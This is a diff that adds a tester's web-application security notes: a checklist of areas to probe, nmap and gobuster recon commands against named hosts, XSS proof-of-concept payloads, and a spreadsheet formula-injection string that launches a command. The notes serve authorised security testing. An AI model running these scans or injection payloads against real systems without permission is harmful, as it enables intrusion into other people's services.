@@ -71,5 +71,36 @@ Recommendations:
 
 
 
+	1. Session
+	2. Access control (admin vs user)
+	3. Input form (XSS, SQL Injection)
+	4. Upload file function
+	5. Scanner
+	6. Authentication (brute force, change pw, user enumeration)
+	
+gobuster dir -u dms.cobaltknitwear.com -w ./directory-list-2.3-medium.txt -b "301,404"
+sudo nmap -vv -sC -sV -p- -Pn dms.cobaltknitwear.com -o ./dms.cobaltknitwear.com.txt //All port='-p', Port443='-p443'
+nmap --script=http-methods -p443 dms.cobaltknitwear.com
+nmap -sV -p1022 dms.cobaltknitwear.com
+sslscan dms.cobaltknitwear.com
+
+<script>alert(1)</script>
+<img src=x onerror=alert(1) />
+<svg onload=alert('XSS')>
+
+Autorecon:
+kali@kali:~/AutoRecon$ sudo python3 autorecon.py -v www.megacorpone.com
+
+In Excel Spreadsheet:
+CSV Injection (https://payatu.com/blog/csv-injection-basic-to-exploit/)
+=HYPERLINK(www.bing.com, Bing)
+=cmd|' /C calc'!xxx
+
+SQL injection Burp Scan
+
+https://temp-mail.org/en/
+Email Rate limit
+![image](https://github.com/user-attachments/assets/36e0e1bf-8598-4a4e-978c-689f6b24fa2d)
+
 
 
